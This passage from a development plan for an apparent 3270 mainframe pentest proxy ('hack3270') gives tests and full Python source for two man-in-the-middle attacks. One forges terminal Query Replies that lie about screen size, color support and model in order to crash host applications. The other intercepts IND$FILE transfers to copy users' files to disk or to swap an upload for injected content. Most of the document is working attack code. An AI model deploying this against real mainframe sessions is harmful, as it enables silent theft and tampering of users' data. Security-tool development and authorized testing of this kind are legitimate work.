    """Implicit Partition carries default + alternate screen sizes.
    GA23-0059 §6.31. qcode = 0xA6."""
    from hack3270_libs.attacks.structured import _sf_implicit_partition
    sf = _sf_implicit_partition(alt_rows=43, alt_cols=132)
    assert sf[2] == 0x81
    assert sf[3] == 0xA6  # Implicit Partition qcode
    # 132 = 0x84, 43 = 0x2B — both should appear
    assert 0x84 in sf
    assert 0x2B in sf


def test_sf_color():
    """Color SF lists supported color-attribute pairs.
    GA23-0059 §6.13. qcode = 0x86."""
    from hack3270_libs.attacks.structured import _sf_color
    sf = _sf_color()
    assert sf[2] == 0x81
    assert sf[3] == 0x86
    # Claims standard 8 colors (0xF1-0xF8)
    for c in range(0xF1, 0xF9):
        assert c in sf


def test_sf_highlighting():
    """Highlighting SF lists supported highlight values.
    GA23-0059 §6.29. qcode = 0x87."""
    from hack3270_libs.attacks.structured import _sf_highlighting
    sf = _sf_highlighting()
    assert sf[2] == 0x81
    assert sf[3] == 0x87


def test_sf_rpq_names():
    """RPQ Names SF carries terminal model identifier.
    GA23-0059 §6.36. qcode = 0xA1."""
    from hack3270_libs.attacks.structured import _sf_rpq
    sf = _sf_rpq("HACK3270")
    assert sf[2] == 0x81
    assert sf[3] == 0xA1
    # RPQ name is EBCDIC inside the payload
    from hackterm_core.ebcdic import EbcdicCodec
    codec = EbcdicCodec()
    assert codec.to_ebcdic("HACK3270") in sf


def test_sf_summary():
    """Summary SF lists which qcodes we'll respond to. GA23-0059 §6.41.
    qcode = 0x80. Payload is a list of single-byte qcodes."""
    from hack3270_libs.attacks.structured import _sf_summary
    sf = _sf_summary([0x81, 0x86, 0x87])
    assert sf[2] == 0x81
    assert sf[3] == 0x80
    # The qcodes we passed appear in the payload
    assert sf[4:7] == bytes([0x81, 0x86, 0x87])


# ---------------------------------------------------------------------------
# Full Query Reply assembly
# ---------------------------------------------------------------------------

def test_build_query_reply_minimal():
    """No lies → standard 24×80 reply with all capabilities."""
    from hack3270_libs.attacks.structured import build_query_reply
    pkt = build_query_reply(QueryLies())
    # Starts with AID 0x88 (structured field AID)
    assert pkt[0] == 0x88
    # Ends with IAC EOR
    assert pkt.endswith(b"\xff\xef")
    # Contains a Null SF terminator
    assert b"\x00\x04\x81\xff" in pkt


def test_build_query_reply_deny_color():
    """deny_color=True → no Color SF in output."""
    from hack3270_libs.attacks.structured import build_query_reply
    pkt = build_query_reply(QueryLies(deny_color=True))
    # qcode 0x86 should NOT appear after a 0x81 SFID
    # (cheap check: the byte sequence 81 86 shouldn't be there)
    assert b"\x81\x86" not in pkt


def test_build_query_reply_includes_color_by_default():
    from hack3270_libs.attacks.structured import build_query_reply
    pkt = build_query_reply(QueryLies(deny_color=False))
    assert b"\x81\x86" in pkt


def test_build_query_reply_deny_highlighting():
    from hack3270_libs.attacks.structured import build_query_reply
    pkt = build_query_reply(QueryLies(deny_highlighting=True))
    assert b"\x81\x87" not in pkt


def test_build_query_reply_alt_dimensions():
    """alt_rows/alt_cols set → Implicit Partition SF included."""
    from hack3270_libs.attacks.structured import build_query_reply
    pkt = build_query_reply(QueryLies(alt_rows=62, alt_cols=160))
    assert b"\x81\xa6" in pkt  # Implicit Partition qcode


def test_build_query_reply_no_implicit_partition_at_default():
    """24×80 with no alt → no Implicit Partition SF."""
    from hack3270_libs.attacks.structured import build_query_reply
    pkt = build_query_reply(QueryLies())
    assert b"\x81\xa6" not in pkt


def test_build_query_reply_rpq_name():
    from hack3270_libs.attacks.structured import build_query_reply
    pkt = build_query_reply(QueryLies(rpq_name="EVILTERM"))
    assert b"\x81\xa1" in pkt  # RPQ Names qcode


def test_build_query_reply_tn3270e_header():
    """When TN3270E mode, prepend the 5-byte header."""
    from hack3270_libs.attacks.structured import build_query_reply
    pkt = build_query_reply(QueryLies(), tn3270e=True, seq=5)
    assert pkt[:5] == bytes([0x00, 0x00, 0x00, 0x00, 0x05])
    assert pkt[5] == 0x88  # AID after header


# ---------------------------------------------------------------------------
# Read Partition Query detection — what triggers our reply
# ---------------------------------------------------------------------------

# Read Partition (Query) wire format:
# [TN3270E hdr] F3 <len:2> 01 FF 02
#               ^^ WSF     ^^ ^^ ^^
#               cmd        SF Read-Partition Query
RP_QUERY = bytes([0xF3, 0x00, 0x05, 0x01, 0xFF, 0x02, 0xFF, 0xEF])
RP_QUERY_TN3270E = bytes([0x00, 0x00, 0x00, 0x00, 0x01]) + RP_QUERY


def test_detect_read_partition_query():
    from hack3270_libs.attacks.structured import is_read_partition_query
    assert is_read_partition_query(RP_QUERY) is True


def test_detect_read_partition_query_tn3270e():
    from hack3270_libs.attacks.structured import is_read_partition_query
    assert is_read_partition_query(RP_QUERY_TN3270E) is True


def test_detect_not_read_partition_query():
    from hack3270_libs.attacks.structured import is_read_partition_query
    # Regular Erase/Write — not WSF
    assert is_read_partition_query(b"\xf5\xc3\x1d\x60\xff\xef") is False


# ---------------------------------------------------------------------------
# QueryReplyLiar — the campaign object
# ---------------------------------------------------------------------------

@pytest.fixture
def liar():
    from hack3270_libs.attacks.structured import QueryReplyLiar
    return QueryReplyLiar()


def test_liar_starts_disarmed(liar):
    assert liar.armed is False


def test_liar_arm(liar):
    liar.arm(QueryLies(alt_rows=62, deny_color=True))
    assert liar.armed is True
    assert liar.lies.alt_rows == 62


def test_liar_intercepts_when_armed(liar, fake_daemon):
    """When armed and we see a Read Partition Query (s2c), we EAT it
    (don't forward to client) and inject our reply (c2s)."""
    liar.arm(QueryLies())
    liar.attach(fake_daemon)

    # Simulate the host sending a Read Partition Query.
    # The liar's intercept eats it (returns None) and synthesizes a reply.
    result = liar._intercept_s2c(RP_QUERY)
    assert result is None  # eaten — not forwarded to client
    assert len(fake_daemon.sent_to_server) == 1  # our synthetic reply
    reply = fake_daemon.sent_to_server[0]
    assert reply[0] == 0x88  # structured-field AID


def test_liar_passes_through_when_disarmed(liar, fake_daemon):
    liar.attach(fake_daemon)
    result = liar._intercept_s2c(RP_QUERY)
    assert result == RP_QUERY  # passed through unchanged
    assert fake_daemon.sent_to_server == []


def test_liar_passes_through_non_query(liar, fake_daemon):
    """Even when armed, non-WSF traffic passes through."""
    liar.arm(QueryLies())
    liar.attach(fake_daemon)
    other = b"\xf5\xc3\x1d\x60\xc1\xff\xef"
    result = liar._intercept_s2c(other)
    assert result == other
```

- [ ] **Step 2: Run, verify failure**

```bash
cd /home/kali/hack3270-update && /home/kali/hack3270-update/.venv/bin/pytest tests/test_structured.py -v
```

Expected: all fail with `ModuleNotFoundError`.

- [ ] **Step 3: Implement structured.py — QR side**

Create `hack3270_libs/attacks/structured.py`:

```python
"""
Structured Field attacks: Query Reply lying + IND$FILE intercept.

Two attacks, one module — they share the SF parser/builder.

QUERY REPLY LYING (spec §3.4 part 1):
  Host sends: WSF Read Partition (Query) — asks the terminal "what can you do?"
  We eat it (don't forward to client). We synthesize a reply with lies:
  oversize screen (62×160 — see if BMS chokes), no color (some apps assume
  color and crash without it), spoofed RPQ name.

IND$FILE INTERCEPT (spec §3.4 part 2 — implemented in Task 5):
  Detects File Transfer SF (type 0xD0). Reassembles 32K blocks.
  Carbon-copy / inject / alert modes.

References:
  GA23-0059 §5 — Structured Fields (general)
  GA23-0059 §6 — Query Reply (per-qcode formats)
"""
import struct
from typing import Optional

from hackterm_core.protocol import QueryLies
from hackterm_core.ebcdic import EbcdicCodec


# ===========================================================================
# Wire constants
# ===========================================================================

SFID_QUERY_REPLY = 0x81

# Query Reply qcodes (GA23-0059 §6 table)
QR_SUMMARY        = 0x80
QR_USABLE_AREA    = 0x81
QR_COLOR          = 0x86
QR_HIGHLIGHTING   = 0x87
QR_RPQ_NAMES      = 0xA1
QR_IMPLICIT_PART  = 0xA6
QR_NULL           = 0xFF

AID_SF = 0x88            # structured-field AID (terminal→host)
IAC_EOR = b"\xff\xef"
TN3270E_HDR_LEN = 5

# Read Partition (Query) detection — host→terminal
# Layout after WSF cmd (0xF3): <len:2> <SFID:1=0x01> <PID:1=0xFF> <type:1=0x02>
CMD_WSF = 0xF3
RP_SFID = 0x01           # Read Partition SFID
RP_QUERY_TYPE = 0x02     # Query (not Query List)


_codec = EbcdicCodec()


# ===========================================================================
# Individual SF builders — GA23-0059 §6
# Each returns a self-describing SF: <len:2 BE> <0x81> <qcode> <payload>
# ===========================================================================

def _sf(qcode: int, payload: bytes) -> bytes:
    """Wrap a payload in a Query Reply SF: <len:2> <0x81> <qcode> <payload>.
    Length is BIG-ENDIAN and INCLUDES the length field itself."""
    body = bytes([SFID_QUERY_REPLY, qcode]) + payload
    length = 2 + len(body)
    return struct.pack(">H", length) + body


def _sf_null() -> bytes:
    """Null SF — terminates the Query Reply sequence. GA23-0059 §6.34."""
    return _sf(QR_NULL, b"")


def _sf_summary(qcodes: list[int]) -> bytes:
    """Summary SF — lists which qcodes follow. GA23-0059 §6.41.
    Payload is just a sequence of qcode bytes."""
    return _sf(QR_SUMMARY, bytes(qcodes))


def _sf_usable_area(rows: int, cols: int) -> bytes:
    """Usable Area SF — screen dimensions. GA23-0059 §6.42.

    Payload (minimal):
      flags(1) addr-mode(1) cols(2) rows(2) units(1)
      Xr(4 — pels per unit, numerator/denominator)
      Yr(4 — same)
      AW(1) AH(1) — char cell width/height
      buffer(2 — total cells)
    """
    flags = 0x01        # 12/14-bit addressing supported
    addr_mode = 0x00    # default
    units = 0x01        # millimeters
    xr = struct.pack(">HH", 1, 10)   # 1/10 mm per pel (made-up but valid)
    yr = struct.pack(">HH", 1, 10)
    aw, ah = 9, 12      # char cell pels (typical 3270)
    bufsize = rows * cols
    payload = (bytes([flags, addr_mode])
               + struct.pack(">H", cols)
               + struct.pack(">H", rows)
               + bytes([units]) + xr + yr
               + bytes([aw, ah])
               + struct.pack(">H", bufsize))
    return _sf(QR_USABLE_AREA, payload)


def _sf_implicit_partition(alt_rows: int, alt_cols: int) -> bytes:
    """Implicit Partition SF — default + alternate sizes. GA23-0059 §6.31.

    Payload:
      flags(2 — reserved, zeros)
      SDP-length(1) SDP-id(1=0x0B) flags(1)
      default-cols(2) default-rows(2)
      alt-cols(2) alt-rows(2)
    """
    sdp = (bytes([0x0B, 0x01, 0x00])              # len, id, flags
           + struct.pack(">H", 80)                # default cols
           + struct.pack(">H", 24)                # default rows
           + struct.pack(">H", alt_cols)
           + struct.pack(">H", alt_rows))
    payload = bytes([0x00, 0x00]) + sdp
    return _sf(QR_IMPLICIT_PART, payload)


def _sf_color() -> bytes:
    """Color SF — supported color-attribute pairs. GA23-0059 §6.13.

    Payload:
      flags(1) np(1=count) (cav, ci)*np
    cav=color-attr-value (0x00=default, 0xF1-0xF8=colors)
    ci=color-identifier (same values)
    """
    flags = 0x00
    pairs = []
    pairs.append((0x00, 0xF4))  # default → green
    for c in range(0xF1, 0xF9):  # all 8 standard colors
        pairs.append((c, c))
    np = len(pairs)
    payload = bytes([flags, np]) + b"".join(bytes([a, i]) for a, i in pairs)
    return _sf(QR_COLOR, payload)


def _sf_highlighting() -> bytes:
    """Highlighting SF — supported highlight values. GA23-0059 §6.29.

    Payload: np(1) (av, hi)*np
    av=attr-value, hi=highlight-id
    Standard: 0x00=default 0xF1=blink 0xF2=reverse 0xF4=underscore
    """
    pairs = [(0x00, 0xF0), (0xF1, 0xF1), (0xF2, 0xF2), (0xF4, 0xF4)]
    np = len(pairs)
    payload = bytes([np]) + b"".join(bytes([a, h]) for a, h in pairs)
    return _sf(QR_HIGHLIGHTING, payload)


def _sf_rpq(name: str) -> bytes:
    """RPQ Names SF — terminal model identifier. GA23-0059 §6.36.

    Payload:
      device-type(4 — EBCDIC, e.g. '3278')
      model(3 — EBCDIC, e.g. '002')
      RPQ-len(1) RPQ-name(EBCDIC, variable)
    """
    devtype = _codec.to_ebcdic("3278")
    model = _codec.to_ebcdic("002")
    rpq_ebcdic = _codec.to_ebcdic(name)
    payload = devtype + model + bytes([len(rpq_ebcdic)]) + rpq_ebcdic
    return _sf(QR_RPQ_NAMES, payload)


# ===========================================================================
# Full Query Reply assembly
# ===========================================================================

def build_query_reply(lies: QueryLies, tn3270e: bool = False,
                      seq: int = 0) -> bytes:
    """Synthesize a complete Query Reply packet.

    Layout: [TN3270E hdr] AID(0x88) <SF>*N <Null SF> IAC EOR

    The lies:
      alt_rows/alt_cols     → Usable Area + Implicit Partition with those values
      deny_color            → omit Color SF (some apps assume color, crash)
      deny_highlighting     → omit Highlighting SF
      rpq_name              → claim to be that terminal model
    """
    sfs = []

    # Build the qcode list for Summary
    qcodes = [QR_SUMMARY, QR_USABLE_AREA]
    if lies.alt_rows or lies.alt_cols:
        qcodes.append(QR_IMPLICIT_PART)
    if not lies.deny_color:
        qcodes.append(QR_COLOR)
    if not lies.deny_highlighting:
        qcodes.append(QR_HIGHLIGHTING)
    if lies.rpq_name:
        qcodes.append(QR_RPQ_NAMES)
    qcodes.append(QR_NULL)

    # Summary first — tells host what's coming
    sfs.append(_sf_summary(qcodes))

    # Usable Area — always present
    rows = lies.alt_rows or 24
    cols = lies.alt_cols or 80
    sfs.append(_sf_usable_area(rows, cols))

    # Implicit Partition — only if alt size requested
    if lies.alt_rows or lies.alt_cols:
        sfs.append(_sf_implicit_partition(rows, cols))

    if not lies.deny_color:
        sfs.append(_sf_color())
    if not lies.deny_highlighting:
        sfs.append(_sf_highlighting())
    if lies.rpq_name:
        sfs.append(_sf_rpq(lies.rpq_name))

    # Null terminator
    sfs.append(_sf_null())

    body = bytes([AID_SF]) + b"".join(sfs) + IAC_EOR

    if tn3270e:
        hdr = bytes([0x00, 0x00, 0x00, (seq >> 8) & 0xFF, seq & 0xFF])
        return hdr + body
    return body


# ===========================================================================
# Read Partition Query detection
# ===========================================================================

def is_read_partition_query(data: bytes) -> bool:
    """Is this packet a WSF Read Partition (Query)?

    Layout: [TN3270E hdr(5)] F3 <len:2> 01 FF 02 [IAC EOR]
    """
    # Strip TN3270E header
    i = 0
    if len(data) >= TN3270E_HDR_LEN + 1 and data[0] <= 0x07:
        i = TN3270E_HDR_LEN
    # Strip IAC EOR
    end = len(data)
    if end >= 2 and data[end-2:end] == IAC_EOR:
        end -= 2
    body = data[i:end]
    if len(body) < 6:
        return False
    if body[0] != CMD_WSF:
        return False
    # body[1:3] is SF length, body[3] is SFID, body[4] is partition-id, body[5] is type
    return body[3] == RP_SFID and body[5] == RP_QUERY_TYPE


# ===========================================================================
# QueryReplyLiar — the campaign object
# ===========================================================================

class QueryReplyLiar:
    """Intercept Read Partition Query and reply with lies.

    Hooks ProxyDaemon two ways:
      1. As an s2c filter — eats the WSF Read Partition (Query) so it
         never reaches the real client.
      2. Calls daemon.inject_to_server() with our synthetic reply.

    The s2c filter is NOT a standard observer (observers can't drop
    packets). We expose _intercept_s2c() and the GUI/MCP wires it via
    a custom hook on ProxyDaemon, OR (simpler) we register as observer
    and use a flag to tell the daemon to drop. For Phase 3 the simplest
    correct approach: the QR is consumed via direct interception in the
    GUI driver, calling _intercept_s2c() before forwarding.
    """

    def __init__(self):
        self.armed = False
        self.lies = QueryLies()
        self._daemon = None
        self._tn3270e = False
        self._seq = 0

    def attach(self, daemon) -> None:
        self._daemon = daemon

    def arm(self, lies: QueryLies) -> None:
        """Enable interception with the given lies."""
        self.lies = lies
        self.armed = True

    def disarm(self) -> None:
        self.armed = False

    def _intercept_s2c(self, data: bytes) -> Optional[bytes]:
        """Filter for s2c traffic. Returns None to EAT the packet,
        or returns data (possibly modified) to forward."""
        if not self.armed:
            return data
        if not is_read_partition_query(data):
            return data

        # It's a Read Partition Query and we're armed. EAT IT.
        # Detect TN3270E to know whether to prepend header on our reply.
        if len(data) >= TN3270E_HDR_LEN and data[0] <= 0x07:
            self._tn3270e = True
            self._seq = (data[3] << 8) | data[4]
        else:
            self._tn3270e = False

        # Synthesize and inject our reply
        reply = build_query_reply(self.lies, tn3270e=self._tn3270e,
                                  seq=self._seq)
        if self._daemon:
            self._daemon.inject_to_server(reply)

        return None  # EAT — don't forward the query to the real client
```

- [ ] **Step 4: Run, verify pass**

```bash
cd /home/kali/hack3270-update && /home/kali/hack3270-update/.venv/bin/pytest tests/test_structured.py -v
```

Expected: `25 passed`

- [ ] **Step 5: Wire build_query_reply into TN3270**

The `Protocol` ABC has `build_query_reply()`. Connect them.

Append to `hack3270_libs/tn3270_v2.py` (inside `TN3270` class):

```python
    # --- Structured fields ----------------------------------------------

    def build_query_reply(self, lies: QueryLies) -> bytes:
        """Build a Query Reply with operator-chosen lies. See attacks/structured.py."""
        # Late import to avoid circular dependency
        from hack3270_libs.attacks.structured import build_query_reply
        return build_query_reply(lies, tn3270e=self.is_tn3270e, seq=self.last_seq)

    def parse_structured(self, data: bytes):
        """Parse a WSF datastream. Returns StructuredField or None.
        Used by IND$FILE detector — implemented in Task 5."""
        from hack3270_libs.attacks.structured import parse_wsf
        return parse_wsf(data)
```

Add a stub `parse_wsf` to `structured.py` (Task 5 fills it in):

```python
def parse_wsf(data: bytes):
    """Parse a Write Structured Field datastream. Stub — Task 5."""
    return None
```

- [ ] **Step 6: Verify Protocol contract still satisfied**

```bash
cd /home/kali/hack3270-update && /home/kali/hack3270-update/.venv/bin/pytest tests/test_tn3270_v2.py tests/test_structured.py -v
```

Expected: all tests still pass.

- [ ] **Step 7: Commit**

```bash
git add hack3270_libs/attacks/structured.py hack3270_libs/tn3270_v2.py tests/test_structured.py
git commit -m "feat(attacks): Query Reply liar — synthesizes SF replies with lies"
```

---

## Task 5: IND$FILE detector

**Files:**
- Modify: `hack3270_libs/attacks/structured.py`
- Modify: `tests/test_structured.py`

Shares the SF parser with Task 4. State machine: IDLE → ARMED → TRANSFERRING → IDLE. Spec §3.4 part 2.

- [ ] **Step 1: Write failing tests**

Append to `tests/test_structured.py`:

```python
# ===========================================================================
# Task 5: IND$FILE detector
# ===========================================================================

# IND$FILE uses File Transfer SFs (SFID = 0xD0).
# Wire format inside WSF: <len:2> <0xD0> <subtype:1> <data...>
# Subtypes (de-facto from x3270 source / Wireshark):
#   0x00 = open request    0x47 = data block (download s2c)
#   0x46 = data block      0x45 = close/EOF
# We don't care which is which for carbon-copy mode — just reassemble.

def _make_indfile_block(payload: bytes, subtype: int = 0x47) -> bytes:
    """Build a File Transfer SF wrapped in WSF + IAC EOR."""
    sf_body = bytes([0xD0, subtype]) + payload
    sf_len = struct.pack(">H", 2 + len(sf_body))
    return bytes([0xF3]) + sf_len + sf_body + b"\xff\xef"


def test_parse_wsf_extracts_sf():
    """parse_wsf returns the StructuredField inside a WSF datastream."""
    from hack3270_libs.attacks.structured import parse_wsf
    pkt = _make_indfile_block(b"hello", subtype=0x47)
    sf = parse_wsf(pkt)
    assert sf is not None
    assert sf.sf_type == 0xD0
    # Payload includes the subtype byte + data
    assert sf.payload == b"\x47hello"


def test_parse_wsf_handles_tn3270e_header():
    from hack3270_libs.attacks.structured import parse_wsf
    pkt = bytes([0x00, 0x00, 0x00, 0x00, 0x01]) + _make_indfile_block(b"data")
    sf = parse_wsf(pkt)
    assert sf is not None
    assert sf.sf_type == 0xD0


def test_parse_wsf_non_wsf_returns_none():
    from hack3270_libs.attacks.structured import parse_wsf
    assert parse_wsf(b"\xf5\xc3\x1d\x60\xff\xef") is None


# ---------------------------------------------------------------------------
# IndFileInterceptor state machine
# ---------------------------------------------------------------------------

@pytest.fixture
def indfile(tmp_path):
    from hack3270_libs.attacks.structured import IndFileInterceptor
    return IndFileInterceptor(capture_dir=str(tmp_path))


def test_indfile_starts_idle(indfile):
    assert indfile.state == "IDLE"


def test_indfile_arm_on_command_text(indfile, fake_daemon):
    """Seeing 'IND$FILE PUT' or 'IND$FILE GET' in a screen → ARMED.
    Note: $ in EBCDIC cp037 is 0x5B."""
    from hack3270_libs.tn3270_v2 import TN3270
    indfile.protocol = TN3270()
    indfile.attach(fake_daemon)

    from hackterm_core.ebcdic import EbcdicCodec
    codec = EbcdicCodec()
    text_pkt = bytes([0xF5, 0xC3, 0x1D, 0x40]) + codec.to_ebcdic("IND$FILE PUT MY.DATA") + b"\xff\xef"
    fake_daemon.fire_s2c(text_pkt)
    assert indfile.state == "ARMED"
    assert indfile.direction == "PUT"


def test_indfile_arm_get_direction(indfile, fake_daemon):
    from hack3270_libs.tn3270_v2 import TN3270
    indfile.protocol = TN3270()
    indfile.attach(fake_daemon)

    from hackterm_core.ebcdic import EbcdicCodec
    codec = EbcdicCodec()
    text_pkt = bytes([0xF5, 0xC3, 0x1D, 0x40]) + codec.to_ebcdic("IND$FILE GET HOST.DATA") + b"\xff\xef"
    fake_daemon.fire_s2c(text_pkt)
    assert indfile.state == "ARMED"
    assert indfile.direction == "GET"


def test_indfile_armed_to_transferring(indfile, fake_daemon):
    """ARMED + see 0xD0 SF → TRANSFERRING."""
    indfile.state = "ARMED"
    indfile.attach(fake_daemon)
    fake_daemon.fire_s2c(_make_indfile_block(b"block one"))
    assert indfile.state == "TRANSFERRING"
    assert b"block one" in indfile.buffer


def test_indfile_accumulates_blocks(indfile, fake_daemon):
    indfile.state = "ARMED"
    indfile.attach(fake_daemon)
    fake_daemon.fire_s2c(_make_indfile_block(b"AAA"))
    fake_daemon.fire_s2c(_make_indfile_block(b"BBB"))
    fake_daemon.fire_s2c(_make_indfile_block(b"CCC"))
    assert indfile.buffer == b"AAABBBCCC"


def test_indfile_eof_returns_to_idle(indfile, fake_daemon):
    """Subtype 0x45 (or empty payload) = EOF → write file → IDLE."""
    indfile.state = "ARMED"
    indfile.mode = "carbon_copy"
    indfile.attach(fake_daemon)
    fake_daemon.fire_s2c(_make_indfile_block(b"data"))
    fake_daemon.fire_s2c(_make_indfile_block(b"", subtype=0x45))
    assert indfile.state == "IDLE"
    assert len(indfile.captures) == 1


def test_indfile_carbon_copy_writes_file(indfile, fake_daemon, tmp_path):
    indfile.state = "ARMED"
    indfile.mode = "carbon_copy"
    indfile.direction = "GET"
    indfile.attach(fake_daemon)
    fake_daemon.fire_s2c(_make_indfile_block(b"file content here"))
    fake_daemon.fire_s2c(_make_indfile_block(b"", subtype=0x45))
    # File written to capture_dir
    files = list(tmp_path.glob("*.bin"))
    assert len(files) == 1
    assert files[0].read_bytes() == b"file content here"


def test_indfile_alert_mode_no_file(indfile, fake_daemon, tmp_path):
    """alert mode: log to captures list but don't write disk."""
    indfile.state = "ARMED"
    indfile.mode = "alert"
    indfile.attach(fake_daemon)
    fake_daemon.fire_s2c(_make_indfile_block(b"data"))
    fake_daemon.fire_s2c(_make_indfile_block(b"", subtype=0x45))
    assert len(indfile.captures) == 1
    assert list(tmp_path.glob("*.bin")) == []  # no files written


def test_indfile_idle_ignores_blocks(indfile, fake_daemon):
    """In IDLE state, 0xD0 SFs we didn't see the command for are ignored
    (could be some other WSF use)."""
    indfile.attach(fake_daemon)
    fake_daemon.fire_s2c(_make_indfile_block(b"orphan"))
    assert indfile.state == "IDLE"
    assert indfile.buffer == b""


def test_indfile_inject_mode_replaces_upload(indfile, fake_daemon):
    """inject mode (PUT only): replace user's blocks with our payload."""
    indfile.state = "ARMED"
    indfile.mode = "inject"
    indfile.direction = "PUT"
    indfile.inject_payload = b"EVIL CONTENT"
    indfile.attach(fake_daemon)

    # User sends a block c2s — intercept rewrites it
    user_block = _make_indfile_block(b"original content", subtype=0x46)
    result = indfile._intercept_c2s(user_block)
    # Result should contain our payload, not the user's
    assert b"EVIL CONTENT" in result
    assert b"original content" not in result
```

- [ ] **Step 2: Run, verify new tests fail**

```bash
cd /home/kali/hack3270-update && /home/kali/hack3270-update/.venv/bin/pytest tests/test_structured.py -v -k indfile or parse_wsf
```

Expected: failures (parse_wsf is a stub, IndFileInterceptor doesn't exist).

- [ ] **Step 3: Implement parse_wsf + IndFileInterceptor**

Replace the `parse_wsf` stub in `hack3270_libs/attacks/structured.py` and append the new class:

```python
# ===========================================================================
# WSF parser — extracts StructuredField from a WSF datastream
# Replaces the stub from Task 4.
# ===========================================================================

from hackterm_core.protocol import StructuredField

SFID_FILE_TRANSFER = 0xD0
SUBTYPE_EOF = 0x45


def parse_wsf(data: bytes) -> Optional[StructuredField]:
    """Parse a Write Structured Field datastream.

    Layout: [TN3270E hdr] F3 <len:2> <sfid:1> <payload...> [IAC EOR]

    Returns the FIRST SF in the stream (multi-SF WSF is rare and
    we only care about File Transfer which is single-SF).
    """
    i = 0
    # Strip TN3270E header
    if len(data) >= TN3270E_HDR_LEN + 1 and data[0] <= 0x07:
        i = TN3270E_HDR_LEN
    # Strip IAC EOR
    end = len(data)
    if end >= 2 and data[end-2:end] == IAC_EOR:
        end -= 2
    body = data[i:end]

    if len(body) < 4 or body[0] != CMD_WSF:
        return None

    # body[1:3] = SF length (BE, includes itself), body[3] = SFID
    sf_len = struct.unpack(">H", body[1:3])[0]
    sfid = body[3]
    # Payload is everything after sfid, up to sf_len bytes from len-field start
    payload_end = 1 + sf_len  # 1 (cmd) + sf_len (which counts from len field)
    payload = body[4:payload_end]

    return StructuredField(sf_type=sfid, payload=payload)


# ===========================================================================
# IndFileInterceptor — File Transfer SF reassembler
# ===========================================================================

import re
import time
import pathlib
from typing import Literal

IndFileMode = Literal["carbon_copy", "inject", "alert"]
IndFileState = Literal["IDLE", "ARMED", "TRANSFERRING"]

# Match "IND$FILE PUT <name>" or "IND$FILE GET <name>" in screen text.
# Note: $ is a regex metachar — escape it.
_INDFILE_RE = re.compile(r"IND\$FILE\s+(PUT|GET)\s+(\S+)", re.IGNORECASE)


class IndFileInterceptor:
    """Detect and reassemble IND$FILE transfers.

    State machine (spec §3.4):
      IDLE → (see "IND$FILE PUT/GET" in screen text) → ARMED
      ARMED → (see SFID 0xD0) → TRANSFERRING
      TRANSFERRING → (accumulate blocks) → (see EOF subtype) → IDLE

    Modes:
      carbon_copy — write reassembled file to capture_dir/<ts>_<dir>_<name>.bin
      inject      — (PUT only) replace user's upload blocks with inject_payload
      alert       — just log to captures list, no disk write
    """

    def __init__(self, capture_dir: str = "./captured_files"):
        self.state: IndFileState = "IDLE"
        self.mode: IndFileMode = "alert"
        self.direction: Optional[str] = None        # "PUT" or "GET"
        self.dataset_name: Optional[str] = None
        self.buffer = bytearray()
        self.captures: list[dict] = []
        self.capture_dir = pathlib.Path(capture_dir)
        self.inject_payload: Optional[bytes] = None
        self._inject_sent = False
        self.protocol = None
        self._daemon = None

    def attach(self, daemon) -> None:
        self._daemon = daemon
        daemon.add_observer(self._observe)

    def _observe(self, data: bytes, direction: str) -> None:
        """Main observer — drives the state machine."""
        if self.state == "IDLE":
            self._check_arm(data, direction)
        elif self.state in ("ARMED", "TRANSFERRING"):
            self._check_block(data)

    def _check_arm(self, data: bytes, direction: str) -> None:
        """IDLE state: watch for IND$FILE command in screen text."""
        if direction != "s2c" or self.protocol is None:
            return
        screen = self.protocol.parse(data)
        m = _INDFILE_RE.search(screen.text)
        if m:
            self.state = "ARMED"
            self.direction = m.group(1).upper()
            self.dataset_name = m.group(2)
            self.buffer = bytearray()
            self._inject_sent = False

    def _check_block(self, data: bytes) -> None:
        """ARMED/TRANSFERRING: watch for File Transfer SFs."""
        sf = parse_wsf(data)
        if sf is None or sf.sf_type != SFID_FILE_TRANSFER:
            return

        # First byte of payload is the subtype
        if len(sf.payload) < 1:
            return
        subtype = sf.payload[0]
        block_data = sf.payload[1:]

        if subtype == SUBTYPE_EOF or (self.state == "TRANSFERRING" and not block_data):
            self._finish_transfer()
            return

        self.state = "TRANSFERRING"
        self.buffer.extend(block_data)

    def _finish_transfer(self) -> None:
        """EOF reached — write file (carbon_copy) or just log (alert)."""
        capture = {
            "timestamp": time.time(),
            "direction": self.direction,
            "dataset": self.dataset_name,
            "size": len(self.buffer),
            "path": None,
        }

        if self.mode == "carbon_copy" and self.buffer:
            self.capture_dir.mkdir(parents=True, exist_ok=True)
            ts = int(capture["timestamp"])
            d = self.direction or "UNK"
            name = (self.dataset_name or "unnamed").replace(".", "_")
            path = self.capture_dir / f"{ts}_{d}_{name}.bin"
            path.write_bytes(bytes(self.buffer))
            capture["path"] = str(path)

        self.captures.append(capture)
        self.state = "IDLE"
        self.buffer = bytearray()
        self.direction = None
        self.dataset_name = None

    # --- Inject mode (PUT only) -----------------------------------------

    def _intercept_c2s(self, data: bytes) -> bytes:
        """Client→server intercept for inject mode.

        When ARMED for a PUT and the user sends a File Transfer block,
        replace its payload with ours. Best-effort — may corrupt
        transfers if block boundaries don't align (spec §8 acknowledges
        this is out of scope to harden).
        """
        if (self.mode != "inject" or self.direction != "PUT"
                or self.inject_payload is None):
            return data

        sf = parse_wsf(data)
        if sf is None or sf.sf_type != SFID_FILE_TRANSFER:
            return data

        if self._inject_sent:
            # Already sent our payload — pass through subsequent blocks
            # (which should just be the EOF)
            return data

        # Rebuild with our payload. Keep the subtype byte from the original.
        subtype = sf.payload[0] if sf.payload else 0x46
        new_payload = bytes([SFID_FILE_TRANSFER, subtype]) + self.inject_payload
        sf_len = struct.pack(">H", 2 + len(new_payload))
        rebuilt = bytes([CMD_WSF]) + sf_len + new_payload + IAC_EOR

        # Preserve TN3270E header if present
        if len(data) >= TN3270E_HDR_LEN and data[0] <= 0x07:
            rebuilt = data[:TN3270E_HDR_LEN] + rebuilt

        self._inject_sent = True
        return rebuilt
```

- [ ] **Step 4: Run, verify pass**

```bash
cd /home/kali/hack3270-update && /home/kali/hack3270-update/.venv/bin/pytest tests/test_structured.py -v
```

Expected: `38 passed` (25 from Task 4 + 13 new)

- [ ] **Step 5: Commit**

```bash
git add hack3270_libs/attacks/structured.py tests/test_structured.py
git commit -m "feat(attacks): IND\$FILE detector — IDLE→ARMED→TRANSFERRING state machine"
```

---

## Task 6: State fuzzer — Flow recording

**Files:**
- Create: `hack3270_libs/attacks/state_fuzz.py`
- Create: `tests/test_state_fuzz.py`

